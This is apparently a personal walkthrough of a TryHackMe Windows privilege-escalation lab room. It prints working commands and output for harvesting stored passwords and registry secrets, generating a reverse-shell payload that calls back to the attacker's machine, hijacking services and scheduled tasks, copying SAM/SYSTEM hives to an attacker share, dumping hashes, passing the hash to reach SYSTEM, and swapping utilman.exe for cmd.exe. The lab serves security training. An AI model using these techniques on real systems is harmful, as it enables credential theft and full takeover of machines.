> https://tryhackme.com/room/windowsprivesc20
> #Offensive #Privilege 

# Task 1 Introduction

前置介绍

# Task 2 Windows Privilege Escalation

介绍了Windows下的权限管理机制
![[Pasted image 20230115114840.png]]

# Task 3 Harvesting Passwords from Usual Spots

介绍了从常见位置中获得密码
```powershell
> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

> cmdkey /list                                                                                                                                                                                                                                                                                                                                                                                                                                              Currently stored credentials:                                                                                                                                                                                                                                                                                                                                                                                                                                                     Target: Domain:interactive=WPRIVESC1\mike.katz                                                                                                                                                                                         Type: Domain Password                                                                                                                                                                                                                  User: WPRIVESC1\mike.katz   
> runas /savecred /user:WPRIVESC1\mike.katz cmd.exe

> powershell
> cd C:\Users\mike.katz\Desktop\
> type flag.txt

> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s                                                                                                                                                                                                                                                                                                                                                                            HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server                                                                                                                                                                    ProxyExcludeList    REG_SZ                                                                                                                                                                                                             ProxyDNS    REG_DWORD    0x1                                                                                                                                                                                                           ProxyLocalhost    REG_DWORD    0x0                                                                                                                                                                                                     ProxyMethod    REG_DWORD    0x0                                                                                                                                                                                                        ProxyHost    REG_SZ    proxy                                                                                                                                                                                                           ProxyPort    REG_DWORD    0x50                                                                                                                                                                                                         ProxyUsername    REG_SZ    thom.smith                                                                                                                                                                                                  ProxyPassword    REG_SZ    CoolPass2021                                                                                                                                                                                                ProxyTelnetCommand    REG_SZ    connect %host %port\n                                                                                                                                                                                  ProxyLogToTerm    REG_DWORD    0x1                                                                                                                                                                                                                                                                                                                                                                                                                                        End of search: 10 match(es) found.  
```
![[Pasted image 20230115121334.png]]

# Task 4 Other Quick Wins

介绍了如何借助计划任务，或者msi安装程序来提权
（以下操作借助msfconsole进行操作，其基本原理可以手操）
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.21.154 LPORT=4444 -f exe -o exp.exe
# 将exp.exe传输到靶机上，可以通过python开http.server
```
在原先的计划任务的bat中加入：
```shell
C:\tasks\exp.exe
```
然后执行以下指令，让计划任务现在就执行一次
```
schtasks /run /tn vulntask
```
然后msfconsole设置侦听器，就可以收到回传的shell
```shell
> use exploit/multi/handler
> ...
> exploit 

[*] Started reverse TCP handler on 10.17.21.154:4444 
[*] Command shell session 1 opened (10.17.21.154:4444 -> 10.10.85.197:49904) at 2023-01-15 13:45:41 +0800

...
PS C:\users\taskusr1\desktop> type flag.txt
type flag.txt
THM{TASK_COMPLETED}
```

# Task 5 Abusing Service Misconfigurations

介绍了通过配置不当的服务来进行提权

## Insecure Permissions on Service Executable
服务可执行文件的不安全权限 
```shell
C:\> cd C:\PROGRA~2\SYSTEM~1\
C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
# 这里使用的是上文所生成的payload
C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
执行完毕后，稍等片刻，就能收到连接：
```shell
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.17.21.154:4444 
[*] Command shell session 1 opened (10.17.21.154:4444 -> 10.10.85.197:49908) at 2023-01-15 14:05:04 +0800

Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----

C:\Windows\system32>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\users\svcusr1\desktop
cd C:\users\svcusr1\desktop
PS C:\users\svcusr1\desktop> ls
ls

    Directory: C:\users\svcusr1\desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
-a----         5/3/2022   1:01 PM             20 flag.txt                                                              

PS C:\users\svcusr1\desktop> type flag.txt
type flag.txt
THM{AT_YOUR_SERVICE}
```

## Unquoted Service Paths
未引用的服务路径 
```shell
C:\MyPrograms>copy C:\PROGRA~2\SYSTEM~1\WService.exe C:\MyPrograms\Disk.exe 
C:\MyPrograms>icacls C:\MyPrograms\Disk.exe /grant Everyone:F 
C:\MyPrograms>sc stop "disk sorter enterprise"
C:\MyPrograms>sc start "disk sorter enterprise"
```
上述操作成功之后，就能收到回连的shell：
```shell
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.17.21.154:4444 
[*] Command shell session 2 opened (10.17.21.154:4444 -> 10.10.85.197:49914) at 2023-01-15 14:28:57 +0800

Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----  

C:\Windows\system32>whoami
whoami
wprivesc1\svcusr2

C:\Windows\system32>cd c:\users\svcusr2\desktop
cd c:\users\svcusr2\desktop

c:\Users\svcusr2\Desktop>type flag.txt
type flag.txt
THM{QUOTES_EVERYWHERE}
```

## Insecure Service Permissions
不安全的服务权限 
```shell
C:\Users\thm-unpriv>cd C:\tools\AccessChk
C:\tools\AccessChk>accesschk64.exe -qlc thmservice 
Accesschk v6.14 - Reports effective permissions for securable objects                                               
Copyright ⌐ 2006-2021 Mark Russinovich                                                                              
Sysinternals - www.sysinternals.com                                                                                                                                                                                                     thmservice                                                                                                          
	DESCRIPTOR FLAGS:                                                                                                 
		[SE_DACL_PRESENT]                                                                                           
		[SE_SACL_PRESENT]                                                                                                   
		[SE_SELF_RELATIVE]                                                                                              
	OWNER: NT AUTHORITY\SYSTEM                                                                                          
	[0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM                                                                          
		SERVICE_QUERY_STATUS                                                                                                
		SERVICE_QUERY_CONFIG                                                                                                
		SERVICE_INTERROGATE                                                                                                 
		SERVICE_ENUMERATE_DEPENDENTS                                                                                        
		SERVICE_PAUSE_CONTINUE                                                                                              
		SERVICE_START                                                                                                       
		SERVICE_STOP                                                                                                        
		SERVICE_USER_DEFINED_CONTROL                                                                                        
		READ_CONTROL                                                                                                  
	[1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators                                                                       
		SERVICE_ALL_ACCESS                                                                                            
	[2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE                                                                     
		SERVICE_QUERY_STATUS                                                                                                
		SERVICE_QUERY_CONFIG                                                                                                
		SERVICE_INTERROGATE                                                                                                 
		SERVICE_ENUMERATE_DEPENDENTS                                                                                        
		SERVICE_USER_DEFINED_CONTROL                                                                                        
		READ_CONTROL                                                                                                  
	[3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE                                                                         
		SERVICE_QUERY_STATUS                                                                                                
		SERVICE_QUERY_CONFIG                                                                                                
		SERVICE_INTERROGATE                                                                                                 
		SERVICE_ENUMERATE_DEPENDENTS                                                                                        
		SERVICE_USER_DEFINED_CONTROL                                                                                        
		READ_CONTROL                                                                                                  
	[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users                                                                                
		SERVICE_ALL_ACCESS  
```
可以发现`BUILTIN\Users`用户组具有：`SERVICE_ALL_ACCESS`，这就提供了动手的机会
```shell
C:\tools\AccessChk>copy C:\MyPrograms\Disk.exe C:\Users\thm-unpriv\exp.exe 
C:\tools\AccessChk>icacls C:\Users\thm-unpriv\exp.exe  /grant Everyone:F   
C:\tools\AccessChk>sc config THMService binPath= "C:\Users\thm-unpriv\exp.exe" obj= LocalSystem                     
	[SC] ChangeServiceConfig SUCCESS 
C:\tools\AccessChk>sc start THMService  
```
就可以收到回连的shell了，操作同上
```shell
PS C:\Users\Administrator\Desktop> type flag.txt 
type flag.txt
THM{INSECURE_SVC_CONFIG}
```

# Task 6 Abusing dangerous privileges

介绍了Windows权限机制中的一些特殊权限，以及如何利用

## SeBackup / SeRestore
SeBackup / SeRestore 备份 
```shell
C:\Windows\system32>whoami /priv                                                                                                                                                                                                                PRIVILEGES INFORMATION                                                                                                  
----------------------                                                                                                                                                                                                                          Privilege Name                Description                    State                                                      
============================= ============================== ========                                                  
SeBackupPrivilege             Back up files and directories  Disabled                                                   
SeRestorePrivilege            Restore files and directories  Disabled                                                   
SeShutdownPrivilege           Shut down the system           Disabled                                                   
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                    
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 
```
然后提取用户NTLMh哈希
```shell
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```
为了从靶机上将数据获取出来，在kali上启动SMB服务：
```shell
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
然后在靶机上，将哈希文件复制到SMB目录中
```shell
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
利用impacket进行哈希检索：
```shell
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
最终使用管理员的哈希值来执行哈希传递攻击，并以 SYSTEM 权限访问目标机器
```shell
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.81.24
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        
```

## SeTakeOwnership
所有权控制权限
通过更改所有权，攻击者可以将`utilman.exe`（无障碍引导程序）替换为恶意payload
```shell
C:\> takeown /f C:\Windows\System32\Utilman.exe
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
C:\Windows\System32\> copy cmd.exe utilman.exe
```
然后在锁定界面，启动无障碍引导，即可打开一个`system`权限的cmd

## SeImpersonate / SeAssignPrimaryToken
访问令牌操纵
**学不懂，建议直接参考教程进行操作**

# Task 7 Abusing vulnerable software

## Unpatched Software
未打补丁的软件

通过老版本/未打补丁的程序、中间件，攻击者有机会通过nday漏洞进行攻击，进而渗透目标

# ask 8 Tools of the Trade

介绍了几款自动化检测工具，来在一定程度上对后续的提权攻击提出建议

- WinPEAS  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- PrivescCheck https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- WES-NG: Windows Exploit Suggester - Next Generation https://github.com/bitsadmin/wesng
- Metasploit  `use multi/recon/local_exploit_suggester`

# Task 9 Conclusion

总结，并推荐了以下项目：
-   [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-   [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
-   [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
-   [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
-   [Decoder's Blog](https://decoder.cloud/)
-   [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
-   [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)